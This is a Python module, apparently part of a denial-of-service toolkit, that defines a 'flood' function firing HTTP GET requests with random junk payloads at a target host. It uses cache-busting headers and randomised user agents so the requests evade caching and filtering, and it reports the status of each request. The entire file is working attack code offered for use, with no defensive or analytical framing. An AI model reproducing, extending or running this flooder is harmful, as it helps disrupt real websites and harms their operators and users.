import random
import requests
from rich.console import Console
from bin.addons.utils import random_useragent

# Define styled print
print = Console().print
red = "red3"
green = "green1"
yellow = "yellow1"


# Load user agents
user_agents = []
for _ in range(30):
    user_agents.append(random_useragent())

# Headers
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
    "User-agent": random.choice(user_agents),
}


def flood(target):
    payload = str(random._urandom(random.randint(10, 150)))
    try:
        r = requests.get(
            f"http://{target[0]}", params=payload, headers=headers, timeout=4
        )
    except requests.exceptions.ConnectTimeout:
        print(f"[{red} bold]✘ ERROR [/{red} bold][{yellow}]Timed out[/{yellow}]")
    except Exception as e:
        print(
            f"[{red} bold]✘ ERROR [/{red} bold] [{yellow}]While sending GET request[/{yellow}]"
        )
    else:
        print(
            f"[{green} bold][{r.status_code}][/{green} bold]"
            + f"[{yellow}]Request sent! Payload size: {len(payload)}[/{yellow}]"
        )
